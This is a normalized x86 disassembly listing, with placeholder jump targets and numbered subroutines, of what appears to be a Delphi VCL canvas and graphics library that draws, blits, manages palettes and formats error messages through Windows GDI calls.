mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x4 ]
mov al [ eax + 0x1c ]
mov edx eax
sub dl 0x1
jb r-xdata
mov [ ebp - 0x10 ] 0x3
mov dl 0x1
mov ecx [ eax ]
call [ ecx + 0x6c ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x18 ]
mov edx [ eax ]
call [ edx + 0x64 ]
mov [ ebp - 0x8 ] eax
jmp r-xdata
xor eax eax
mov [ ebp - 0x10 ] eax
jmp r-xdata
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x14 ]
call sub_41cd14
mov [ ebp - 0xc ] eax
lea eax [ ebp - 0x10 ]
push eax
call CreateBrushIndirect
mov edx [ ebp - 0x4 ]
mov [ edx + 0x8 ] eax
mov [ ebp - 0x10 ] 0x1
jmp r-xdata
jmp r-xdata
mov [ ebp - 0x10 ] 0x2
and eax 0x7f
sub eax 0x2
mov [ ebp - 0x8 ] eax
sub_41dae4
push ebx
push esi
add esp 0xfffffff0
mov ebx edx
mov esi eax
mov edx esp
mov eax esi
call sub_41d928
mov eax ebx
mov [ esp + 0xc ] al
cmp al 0x1
jne r-xdata
mov edx esp
mov eax esi
call sub_41d944
add esp 0x10
pop esi
pop ebx
retn
mov [ esp + 0x4 ] 0xffffff
sub_41db18
push ebx
push esi
push edi
test dl dl
je r-xdata
mov ebx edx
mov edi eax
xor edx edx
mov eax edi
call sub_403314
lea eax [ edi + 0x38 ]
push eax
call InitializeCriticalSection
mov dl 0x1
mov eax [ r-xdata ]
call sub_41d000
mov esi eax
mov [ edi + 0xc ] esi
mov [ esi + 0xc ] edi
mov [ esi + 0x8 ] sub_41e47c
lea eax [ edi + 0x38 ]
mov [ esi + 0x14 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_41d52c
mov esi eax
mov [ edi + 0x10 ] esi
mov [ esi + 0xc ] edi
mov [ esi + 0x8 ] sub_41e49c
lea eax [ edi + 0x38 ]
mov [ esi + 0x14 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_41d818
mov esi eax
mov [ edi + 0x14 ] esi
mov [ esi + 0xc ] edi
mov [ esi + 0x8 ] sub_41e4bc
lea eax [ edi + 0x38 ]
mov [ esi + 0x14 ] eax
mov [ edi + 0x20 ] 0xcc0020
mov al [ r-xdata ]
mov [ edi + 0x8 ] al
mov edx edi
mov eax [ rw-data ]
call sub_4146dc
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403668
mov eax edi
pop edi
pop esi
pop ebx
retn
call sub_4036c0
pop [ fs : 0x0 ]
add esp 0xc
sub_41dbdc
push ebx
push esi
call sub_4036d0
mov ebx edx
mov esi eax
mov edx esi
mov eax [ rw-data ]
call sub_414778
xor edx edx
mov eax esi
call sub_41e2b4
mov eax [ esi + 0xc ]
call sub_403344
mov eax [ esi + 0x10 ]
call sub_403344
mov eax [ esi + 0x14 ]
call sub_403344
lea eax [ esi + 0x38 ]
push eax
call DeleteCriticalSection
mov edx ebx
and dl 0xfc
mov eax esi
call sub_414988
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4036b8
sub_41dc38
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov esi edx
mov ebx eax
mov edi [ ebp + 0x8 ]
mov eax ebx
mov edx [ eax ]
call [ edx + 0x10 ]
mov dl [ r-xdata ]
mov eax ebx
call sub_41e308
mov dl [ r-xdata ]
mov eax [ ebp - 0x4 ]
call sub_41e308
mov edx [ ebx + 0x20 ]
push edx
mov edx [ edi + 0xc ]
sub edx [ edi + 0x4 ]
push edx
mov edx [ edi + 0x8 ]
sub edx [ edi ]
push edx
mov edx [ edi + 0x4 ]
push edx
mov edx [ edi ]
push edx
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x4 ]
push edx
mov edx [ esi + 0xc ]
sub edx [ esi + 0x4 ]
push edx
mov edx [ esi + 0x8 ]
mov eax [ esi ]
sub edx eax
push edx
mov edx [ esi + 0x4 ]
push edx
push eax
mov eax [ ebx + 0x4 ]
push eax
call StretchBlt
mov eax ebx
mov edx [ eax ]
call [ edx + 0xc ]
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x4
sub_41dcc0
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov edi edx
mov ebx eax
mov esi [ ebp + 0x8 ]
test esi esi
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
mov eax esi
mov edx [ eax ]
call [ edx + 0x1c ]
test al al
jne r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x10 ]
mov dl [ r-xdata ]
mov eax ebx
call sub_41e308
mov eax [ ebx + 0x14 ]
call sub_41d9c0
call sub_41cd14
push eax
mov eax [ ebx + 0x4 ]
push eax
call SetBkColor
mov eax [ ebx + 0xc ]
mov eax [ eax + 0x18 ]
call sub_41cd14
push eax
mov eax [ ebx + 0x4 ]
push eax
call SetTextColor
mov eax esi
mov edx [ eax ]
call [ edx + 0x20 ]
add eax [ ebp - 0x4 ]
push eax
lea eax [ ebp - 0x14 ]
push eax
mov eax esi
mov edx [ eax ]
call [ edx + 0x2c ]
mov ecx eax
add ecx edi
mov edx [ ebp - 0x4 ]
mov eax edi
call sub_412f04
lea ecx [ ebp - 0x14 ]
mov edx ebx
mov eax esi
mov esi [ eax ]
call [ esi + 0x14 ]
mov eax ebx
mov edx [ eax ]
call [ edx + 0xc ]
sub_41dd6c
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x10 ]
mov dl [ r-xdata ]
mov eax ebx
call sub_41e308
push esi
mov eax [ ebx + 0x4 ]
push eax
call DrawFocusRect
mov eax ebx
mov edx [ eax ]
call [ edx + 0xc ]
pop esi
pop ebx
retn
sub_41dda0
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x10 ]
mov dl [ r-xdata ]
mov eax ebx
call sub_41e308
mov eax [ ebx + 0x14 ]
call sub_41d9fc
push eax
push esi
mov eax [ ebx + 0x4 ]
push eax
call FillRect
mov eax ebx
mov edx [ eax ]
call [ edx + 0xc ]
pop esi
pop ebx
retn
sub_41dddc
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x10 ]
mov dl [ r-xdata ]
mov eax ebx
call sub_41e308
mov eax [ ebx + 0x14 ]
call sub_41d9fc
push eax
push esi
mov eax [ ebx + 0x4 ]
push eax
call FrameRect
mov eax ebx
mov edx [ eax ]
call [ edx + 0xc ]
pop esi
pop ebx
retn
sub_41de18
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x10 ]
mov dl [ r-xdata ]
mov eax ebx
call sub_41e308
push edi
push esi
mov eax [ ebx + 0x4 ]
push eax
call LineTo
mov eax ebx
mov edx [ eax ]
call [ edx + 0xc ]
pop edi
pop esi
pop ebx
retn
sub_41de78
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov dl [ r-xdata ]
mov eax ebx
call sub_41e308
push 0x0
push edi
push esi
mov eax [ ebx + 0x4 ]
push eax
call MoveToEx
pop edi
pop esi
pop ebx
retn
sub_41dea4
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x10 ]
mov dl [ r-xdata ]
mov eax ebx
call sub_41e308
inc edi
push edi
push esi
mov eax [ ebx + 0x4 ]
push eax
call Polyline
mov eax ebx
mov edx [ eax ]
call [ edx + 0xc ]
pop edi
pop esi
pop ebx
retn
sub_41dedc
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x10 ]
mov dl [ r-xdata ]
mov eax ebx
call sub_41e308
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0xc ]
push eax
push edi
push esi
mov eax [ ebx + 0x4 ]
push eax
call Rectangle
mov eax ebx
mov edx [ eax ]
call [ edx + 0xc ]
pop edi
pop esi
pop ebx
pop ebp
retn 0x8
sub_41df24
push ebx
push esi
push edi
mov esi ecx
mov edi edx
mov ebx eax
test esi esi
je r-xdata
pop edi
pop esi
pop ebx
retn
mov eax ebx
mov edx [ eax ]
call [ edx + 0x10 ]
mov dl [ r-xdata ]
mov eax ebx
call sub_41e308
mov ecx edi
mov edx ebx
mov eax esi
mov esi [ eax ]
call [ esi + 0x14 ]
mov eax ebx
mov edx [ eax ]
call [ edx + 0xc ]
sub_41df60
push ebx
push esi
add esp 0xfffffff8
mov esi eax
xor ebx ebx
test [ esi + 0x54 ] 0x80
je r-xdata
mov eax ebx
pop ecx
pop edx
pop esi
pop ebx
retn
push esp
mov eax esi
call sub_41e234
push eax
call GetWindowOrgEx
cmp [ esp ] 0x0
je r-xdata
mov bl 0x1
sub_41df8c
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
push esi
push edi
mov esi edx
lea edi [ ebp - 0x14 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov [ ebp - 0x4 ] ecx
mov ebx eax
mov esi [ ebp + 0x8 ]
mov eax ebx
mov edx [ eax ]
call [ edx + 0x10 ]
mov dl [ r-xdata ]
mov eax ebx
call sub_41e308
mov edi [ ebx + 0x54 ]
or edi 0x4
mov eax [ ebx + 0x14 ]
call sub_41dadc
cmp al 0x1
je r-xdata
test [ ebx + 0x54 ] 0x80
je r-xdata
or edi 0x2
push 0x0
mov eax esi
call sub_404354
push eax
mov eax esi
call sub_404554
push eax
lea eax [ ebp - 0x14 ]
push eax
push edi
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp - 0x4 ]
push eax
mov eax [ ebx + 0x4 ]
push eax
call ExtTextOutA
mov eax ebx
mov edx [ eax ]
call [ edx + 0xc ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
mov eax ebx
call sub_41df60
cmp al 0x1
jne r-xdata
mov edx esi
mov eax ebx
call sub_41e070
inc eax
add [ ebp - 0x4 ] eax
sub_41e02c
push ebx
push esi
push edi
mov esi ecx
mov edi edx
mov ebx eax
mov dl [ r-xdata ]
mov eax ebx
call sub_41e308
xor eax eax
mov [ esi ] eax
xor eax eax
mov [ esi + 0x4 ] eax
push esi
mov eax edi
call sub_404354
push eax
mov eax edi
call sub_404554
push eax
mov eax [ ebx + 0x4 ]
push eax
call GetTextExtentPoint32A
pop edi
pop esi
pop ebx
retn
sub_41e070
push ebx
push esi
add esp 0xfffffff8
mov esi edx
mov ebx eax
mov ecx esp
mov edx esi
mov eax ebx
call sub_41e02c
mov eax [ esp ]
pop ecx
pop edx
pop esi
pop ebx
retn
sub_41e08c
push ebx
push esi
add esp 0xfffffff8
mov esi edx
mov ebx eax
mov ecx esp
mov edx esi
mov eax ebx
call sub_41e02c
mov eax [ esp + 0x4 ]
pop ecx
pop edx
pop esi
pop ebx
retn
sub_41e0ac
push ebp
mov ebp esp
push ecx
push ebx
mov ebx eax
push rw-data
call EnterCriticalSection
xor eax eax
push ebp
push sub_41e0f8
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebx + 0x50 ] 0x0
sete [ ebp - 0x1 ]
cmp [ ebp - 0x1 ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41e0ff
push rw-data
call LeaveCriticalSection
retn
mov eax ebx
call sub_41de50
sub_41e158
push ebx
push esi
mov esi edx
mov ebx eax
mov dl [ r-xdata ]
mov eax ebx
call sub_41e308
push esi
mov eax [ ebx + 0x4 ]
push eax
call GetCurrentPositionEx
pop esi
pop ebx
retn
sub_41e17c
push esi
push edi
add esp 0xfffffff8
mov esi edx
lea edi [ esp ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov ecx [ esp + 0x4 ]
mov edx [ esp ]
call sub_41de78
pop ecx
pop edx
pop edi
pop esi
retn
sub_41e19c
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov dl [ r-xdata ]
mov eax ebx
call sub_41e308
push edi
push esi
mov eax [ ebx + 0x4 ]
push eax
call GetPixel
pop edi
pop esi
pop ebx
retn
sub_41e1c8
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x10 ]
mov dl [ r-xdata ]
mov eax ebx
call sub_41e308
mov eax [ ebp + 0x8 ]
call sub_41cd14
push eax
push edi
push esi
mov eax [ ebx + 0x4 ]
push eax
call SetPixel
mov eax ebx
mov edx [ eax ]
call [ edx + 0xc ]
pop edi
pop esi
pop ebx
pop ebp
retn 0x4
sub_41e210
push ebx
push esi
mov esi edx
mov ebx eax
mov dl [ r-xdata ]
mov eax ebx
call sub_41e308
push esi
mov eax [ ebx + 0x4 ]
push eax
call GetClipBox
pop esi
pop ebx
retn
sub_41e254
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x4 ]
test esi esi
je r-xdata
pop esi
pop ebx
retn
mov al [ r-xdata ]
not eax
and al [ ebx + 0x8 ]
mov dl [ ebx + 0x8 ]
cmp dl al
je r-xdata
mov eax [ rw-data ]
push eax
push esi
call SelectObject
mov eax [ rw-data ]
push eax
mov eax [ ebx + 0x4 ]
push eax
call SelectObject
mov eax [ rw-data ]
push eax
mov eax [ ebx + 0x4 ]
push eax
call SelectObject
mov al [ r-xdata ]
not eax
and al [ ebx + 0x8 ]
mov [ ebx + 0x8 ] al
sub_41e2b4
push ebx
push esi
add esp 0xfffffff8
mov esi edx
mov ebx eax
mov eax [ ebx + 0x4 ]
cmp esi eax
je r-xdata
pop ecx
pop edx
pop esi
pop ebx
retn
test eax eax
je r-xdata
test esi esi
je r-xdata
mov eax ebx
call sub_41e254
mov edx esp
mov eax ebx
call sub_41e158
mov eax [ esp ]
mov [ ebx + 0x18 ] eax
mov eax [ esp + 0x4 ]
mov [ ebx + 0x1c ] eax
xor eax eax
mov [ ebx + 0x4 ] eax
and [ ebx + 0x8 ] 0xfe
or [ ebx + 0x8 ] 0x1
mov [ ebx + 0x4 ] esi
lea edx [ ebx + 0x18 ]
mov eax ebx
call sub_41e17c
sub_41e308
push ebx
push esi
push ecx
mov [ esp ] dl
mov esi eax
mov bl [ esi + 0x8 ]
not ebx
and bl [ esp ]
mov al [ r-xdata ]
cmp al bl
je r-xdata
pop edx
pop esi
pop ebx
retn
test bl 0x1
je r-xdata
test bl 0x2
je r-xdata
mov eax esi
mov edx [ eax ]
call [ edx + 0x14 ]
cmp [ esi + 0x4 ] 0x0
jne r-xdata
test bl 0x4
je r-xdata
mov eax esi
call sub_41e3a4
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bd78
call sub_403ad0
test bl 0x8
je r-xdata
mov eax esi
call sub_41e3d0
or bl [ esi + 0x8 ]
mov [ esi + 0x8 ] bl
mov eax esi
call sub_41e400
sub_41e3a4
push ebx
mov ebx eax
mov eax [ ebx + 0xc ]
call sub_41d1e8
push eax
mov eax [ ebx + 0x4 ]
push eax
call SelectObject
mov eax [ ebx + 0xc ]
mov eax [ eax + 0x18 ]
call sub_41cd14
push eax
mov eax [ ebx + 0x4 ]
push eax
call SetTextColor
pop ebx
retn
sub_41e3d0
push ebx
mov ebx eax
mov eax [ ebx + 0x10 ]
call sub_41d6e8
push eax
mov eax [ ebx + 0x4 ]
push eax
call SelectObject
mov eax [ ebx + 0x10 ]
movzx eax [ eax + 0x18 ]
movzx eax [ eax * 2 + rw-data ]
push eax
mov eax [ ebx + 0x4 ]
push eax
call SetROP2
pop ebx
retn
sub_41e400
push ebx
mov ebx eax
mov eax [ ebx + 0x14 ]
call sub_41d9fc
push eax
call UnrealizeObject
mov eax [ ebx + 0x14 ]
call sub_41d9fc
push eax
mov eax [ ebx + 0x4 ]
push eax
call SelectObject
mov eax [ ebx + 0x14 ]
call sub_41dadc
test al al
jne r-xdata
mov eax [ ebx + 0x14 ]
call sub_41d9c0
call sub_41cd14
not eax
push eax
mov eax [ ebx + 0x4 ]
push eax
call SetBkColor
push 0x1
mov eax [ ebx + 0x4 ]
push eax
call SetBkMode
pop ebx
retn
mov eax [ ebx + 0x14 ]
call sub_41d9c0
call sub_41cd14
push eax
mov eax [ ebx + 0x4 ]
push eax
call SetBkColor
push 0x2
mov eax [ ebx + 0x4 ]
push eax
call SetBkMode
pop ebx
retn
sub_41e530
push ebp
mov ebp esp
push 0x0
xor eax eax
push ebp
push sub_41e57a
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405ca4
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bcbc
call sub_403ad0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41e581
lea eax [ ebp - 0x4 ]
call sub_404094
retn
sub_41e584
push ebp
mov ebp esp
add esp 0xfffffefc
push ebx
xor eax eax
mov [ ebp - 0x104 ] eax
xor eax eax
push ebp
push sub_41e620
push [ fs : eax ]
mov [ fs : eax ] esp
call GetLastError
mov ebx eax
test ebx ebx
je r-xdata
call sub_41e530
push 0x0
push 0x100
lea eax [ ebp - 0x100 ]
push eax
push 0x400
push ebx
push 0x0
push 0x1000
call FormatMessageA
test eax eax
je r-xdata
lea eax [ ebp - 0x104 ]
lea edx [ ebp - 0x100 ]
mov ecx 0x100
call sub_404304
mov ecx [ ebp - 0x104 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bcbc
call sub_403ad0
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41e627
lea eax [ ebp - 0x104 ]
call sub_404094
retn
sub_41e63c
push ebp
mov ebp esp
add esp 0xffffffcc
push ebx
push esi
push edi
mov esi edx
lea edi [ ebp - 0xc ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov ebx ecx
mov [ ebp - 0x4 ] eax
push 0x0
call CreateCompatibleDC
mov [ ebp - 0x18 ] eax
push 0x0
call CreateCompatibleDC
mov [ ebp - 0x1c ] eax
xor eax eax
push ebp
push sub_41e78a
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x34 ]
push eax
push 0x18
mov eax [ ebp - 0x4 ]
push eax
call GetObjectA
test bl bl
je r-xdata
push 0x0
call GetDC
mov [ ebp - 0x14 ] eax
cmp [ ebp - 0x14 ] 0x0
jne r-xdata
push 0x0
push 0x1
push 0x1
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0xc ]
push eax
call CreateBitmap
mov [ ebp - 0x10 ] eax
jmp r-xdata
xor eax eax
push ebp
push sub_41e6f9
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0xc ]
push eax
mov eax [ ebp - 0x14 ]
push eax
call CreateCompatibleBitmap
mov [ ebp - 0x10 ] eax
cmp [ ebp - 0x10 ] 0x0
jne r-xdata
call sub_41e584
cmp [ ebp - 0x10 ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x14 ]
push eax
push 0x0
call ReleaseDC
retn
call sub_41e584
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41e791
mov eax [ ebp - 0x18 ]
push eax
call DeleteDC
mov eax [ ebp - 0x1c ]
push eax
call DeleteDC
retn
mov eax [ ebp - 0x4 ]
push eax
mov eax [ ebp - 0x18 ]
push eax
call SelectObject
mov ebx eax
mov eax [ ebp - 0x10 ]
push eax
mov eax [ ebp - 0x1c ]
push eax
call SelectObject
mov esi eax
push 0xcc0020
mov eax [ ebp - 0x2c ]
push eax
mov eax [ ebp - 0x30 ]
push eax
push 0x0
push 0x0
mov eax [ ebp - 0x18 ]
push eax
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0xc ]
push eax
push 0x0
push 0x0
mov eax [ ebp - 0x1c ]
push eax
call StretchBlt
test ebx ebx
je r-xdata
test esi esi
je r-xdata
push ebx
mov eax [ ebp - 0x18 ]
push eax
call SelectObject
push esi
mov eax [ ebp - 0x1c ]
push eax
call SelectObject
sub_41e79c
mov edx eax
dec dx
je r-xdata
mov ecx eax
mov eax 0x1
shl eax cl
retn
sub dx 0x3
je r-xdata
sub dx 0x4
jne r-xdata
xor eax eax
retn
sub_41e7d0
push ebp
mov ebp esp
add esp 0xffffffdc
push ebx
push esi
push edi
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov edi eax
mov esi [ ebp + 0x14 ]
mov ebx [ ebp + 0x18 ]
mov [ ebp - 0x9 ] 0x1
mov eax [ rw-data ]
cmp [ eax ] 0x2
jne r-xdata
xor eax eax
mov [ ebp - 0x24 ] eax
push 0x0
call CreateCompatibleDC
call sub_41e62c
mov [ ebp - 0x10 ] eax
xor eax eax
push ebp
push sub_41ea50
push [ fs : eax ]
mov [ fs : eax ] esp
push esi
push ebx
mov eax [ ebp + 0x24 ]
push eax
call CreateCompatibleBitmap
call sub_41e62c
mov [ ebp - 0x14 ] eax
mov eax [ ebp - 0x14 ]
push eax
mov eax [ ebp - 0x10 ]
push eax
call SelectObject
mov [ ebp - 0x18 ] eax
push 0x0
mov eax [ rw-data ]
push eax
mov eax [ ebp + 0x24 ]
push eax
call SelectPalette
mov [ ebp - 0x24 ] eax
push 0x0
mov eax [ ebp - 0x24 ]
push eax
mov eax [ ebp + 0x24 ]
push eax
call SelectPalette
cmp [ ebp - 0x24 ] 0x0
je r-xdata
cmp ebx [ ebp + 0x2c ]
jne r-xdata
push 0xffffffff
mov eax [ rw-data ]
push eax
mov eax [ ebp - 0x10 ]
push eax
call SelectPalette
mov [ ebp - 0x24 ] eax
push 0xffffffff
mov eax [ ebp - 0x24 ]
push eax
mov eax [ ebp - 0x10 ]
push eax
call SelectPalette
mov [ ebp - 0x24 ] eax
jmp r-xdata
cmp esi [ ebp + 0x28 ]
jne r-xdata
mov eax [ ebp - 0x14 ]
push eax
call DeleteObject
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41ea57
cmp [ ebp - 0x24 ] 0x0
je r-xdata
mov eax [ ebp - 0x18 ]
push eax
mov eax [ ebp - 0x10 ]
push eax
call SelectObject
mov eax [ ebp - 0x10 ]
push eax
call RealizePalette
push 0xcc0020
push esi
push ebx
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x10 ]
push eax
push esi
push ebx
push 0x0
push 0x0
mov eax [ ebp - 0x10 ]
push eax
call StretchBlt
push r-xdata
push esi
push ebx
mov eax [ ebp + 0x1c ]
push eax
mov eax [ ebp + 0x20 ]
push eax
mov eax [ ebp + 0x24 ]
push eax
push esi
push ebx
push 0x0
push 0x0
mov eax [ ebp - 0x10 ]
push eax
call StretchBlt
push 0x0
push edi
call SetTextColor
mov [ ebp - 0x1c ] eax
push 0xffffff
push edi
call SetBkColor
mov [ ebp - 0x20 ] eax
push 0x8800c6
push esi
push ebx
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x10 ]
push eax
mov eax [ ebp + 0x28 ]
push eax
mov eax [ ebp + 0x2c ]
push eax
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0x4 ]
push eax
push edi
call StretchBlt
push 0x660046
push esi
push ebx
push 0x0
push 0x0
mov eax [ ebp - 0x10 ]
push eax
mov eax [ ebp + 0x28 ]
push eax
mov eax [ ebp + 0x2c ]
push eax
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0x4 ]
push eax
push edi
call StretchBlt
mov eax [ ebp - 0x1c ]
push eax
push edi
call SetTextColor
mov eax [ ebp - 0x20 ]
push eax
push edi
call SetBkColor
cmp [ ebp - 0x18 ] 0x0
je r-xdata
push 0x1
push 0x1
mov eax [ ebp + 0x24 ]
push eax
call CreateCompatibleBitmap
call sub_41e62c
mov [ ebp - 0x14 ] eax
mov eax [ ebp - 0x14 ]
push eax
mov eax [ ebp + 0x10 ]
push eax
call SelectObject
mov [ ebp - 0x14 ] eax
xor eax eax
push ebp
push sub_41e8a3
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx 0xcc0020
mov eax 0xaa0029
call sub_406c5c
push eax
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp - 0x14 ]
push eax
mov eax [ ebp + 0x1c ]
push eax
mov eax [ ebp + 0x20 ]
push eax
mov eax [ ebp + 0x24 ]
push eax
mov eax [ ebp + 0x28 ]
push eax
mov eax [ ebp + 0x2c ]
push eax
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0x4 ]
push eax
push edi
call MaskBlt
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41ea57
mov eax [ ebp - 0x14 ]
push eax
mov eax [ ebp + 0x10 ]
push eax
call SelectObject
mov [ ebp - 0x14 ] eax
mov eax [ ebp - 0x14 ]
push eax
call DeleteObject
retn
mov eax [ ebp - 0x10 ]
push eax
call DeleteDC
retn
push 0x0
mov eax [ ebp - 0x24 ]
push eax
mov eax [ ebp - 0x10 ]
push eax
call SelectPalette
sub_41ea64
push ebx
push esi
push edi
mov esi eax
mov edi esi
mov edx 0xff
lea eax [ edi + edx * 4 ]
lea ecx [ edx + edx * 2 ]
lea ecx [ esi + ecx ]
mov bl [ ecx + 0x2 ]
mov [ eax + 0x2 ] bl
mov bl [ ecx + 0x1 ]
mov [ eax + 0x1 ] bl
mov cl [ ecx ]
mov [ eax ] cl
mov [ eax + 0x3 ] 0x0
dec edx
test edx edx
jne r-xdata
mov [ edi + 0x3 ] 0x0
pop edi
pop esi
pop ebx
retn
sub_41ea9c
push ebx
push esi
push edi
add esp 0xfffffff8
mov [ esp ] edx
mov esi eax
mov [ esp + 0x4 ] esi
mov edi [ esp ]
mov edi [ edi ]
dec edi
test edi edi
jle r-xdata
mov eax [ esp ]
cmp [ eax ] 0x100
jge r-xdata
mov ecx 0x1
pop ecx
pop edx
pop edi
pop esi
pop ebx
retn
mov eax [ esp ]
mov edx 0x100
sub edx [ eax ]
lea edx [ edx + edx * 2 ]
mov eax [ esp ]
mov eax [ eax ]
lea eax [ eax + eax * 2 ]
lea eax [ esi + eax ]
xor ecx ecx
call sub_402d44
mov eax [ esp ]
mov [ eax ] 0x100
mov eax [ esp + 0x4 ]
lea eax [ eax + ecx * 4 ]
lea edx [ ecx + ecx * 2 ]
lea edx [ esi + edx ]
mov bl [ eax + 0x2 ]
mov [ edx + 0x2 ] bl
mov bl [ eax + 0x1 ]
mov [ edx + 0x1 ] bl
mov al [ eax ]
mov [ edx ] al
inc ecx
dec edi
jne r-xdata
sub_41eb14
push ebp
mov ebp esp
add esp 0xffffffd4
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
lea eax [ ebp - 0x2c ]
push eax
call GetSystemInfo
mov edx [ ebp - 0x4 ]
mov ecx [ ebp - 0x8 ]
dec ecx
js r-xdata
mov esp ebp
pop ebp
retn
lea eax [ ebp - 0x2c ]
cmp [ eax + 0x20 ] 0x3
je r-xdata
push ebx
mov eax [ edx + ecx * 4 ]
bswap eax
shr eax 0x8
mov [ edx + ecx * 4 ] eax
dec ecx
jns r-xdata
xor ebx ebx
mov eax [ edx + ecx * 4 ]
mov bh al
mov bl ah
shr eax 0x10
shl ebx 0x8
mov bl al
mov [ edx + ecx * 4 ] ebx
dec ecx
jns r-xdata
pop ebx
jmp r-xdata
sub_41eb6c
push ebp
mov ebp esp
add esp 0xfffffbf8
push ebx
mov [ ebp - 0x408 ] 0x300
mov [ ebp - 0x406 ] 0x10
lea edx [ ebp - 0x404 ]
mov ecx 0x40
call sub_4028f0
push 0x0
call GetDC
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_41ec69
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x68
mov eax [ ebp - 0x4 ]
push eax
call GetDeviceCaps
mov ebx eax
cmp ebx 0x10
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41ec70
mov eax [ ebp - 0x4 ]
push eax
push 0x0
call ReleaseDC
retn
lea eax [ ebp - 0x404 ]
push eax
push 0x8
push 0x0
mov eax [ ebp - 0x4 ]
push eax
call GetSystemPaletteEntries
cmp [ ebp - 0x3e8 ] 0xc0c0c0
jne r-xdata
movzx eax [ ebp - 0x406 ]
lea eax [ ebp + eax * 4 - 0x424 ]
push eax
push 0x8
sub ebx 0x8
push ebx
mov eax [ ebp - 0x4 ]
push eax
call GetSystemPaletteEntries
lea eax [ ebp - 0x3e8 ]
push eax
push 0x1
mov eax ebx
sub eax 0x8
push eax
mov eax [ ebp - 0x4 ]
push eax
call GetSystemPaletteEntries
movzx eax [ ebp - 0x406 ]
lea eax [ ebp + eax * 4 - 0x420 ]
push eax
push 0x7
sub ebx 0x7
push ebx
mov eax [ ebp - 0x4 ]
push eax
call GetSystemPaletteEntries
lea eax [ ebp - 0x3e4 ]
push eax
push 0x1
push 0x7
mov eax [ ebp - 0x4 ]
push eax
call GetSystemPaletteEntries
jmp r-xdata
sub_41ec84
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov ebx eax
mov [ ebp - 0x1 ] 0x0
cmp [ rw-data ] 0x0
je r-xdata
